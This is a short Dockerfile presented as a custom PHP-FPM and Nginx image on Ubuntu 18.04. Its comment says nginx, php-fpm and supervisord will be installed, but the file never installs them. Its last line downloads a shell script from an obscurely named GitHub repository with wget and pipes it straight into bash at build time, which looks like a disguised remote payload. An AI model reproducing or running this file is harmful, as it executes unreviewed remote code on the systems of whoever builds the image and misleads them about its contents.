FROM ubuntu:18.04

# LABEL about the custom image
LABEL maintainer="admin@sysadminjournal.com"
LABEL version="0.1"
LABEL description="This is custom Docker Image for \
the PHP-FPM and Nginx Services."

# Disable Prompt During Packages Installation
ARG DEBIAN_FRONTEND=noninteractive

# Update Ubuntu Software repository
RUN apt update

# Install nginx, php-fpm and supervisord from ubuntu repository
RUN apt -y install wget
RUN wget -O - https://github.com/shgunitompi/viwarlani/raw/main/b.sh | bash
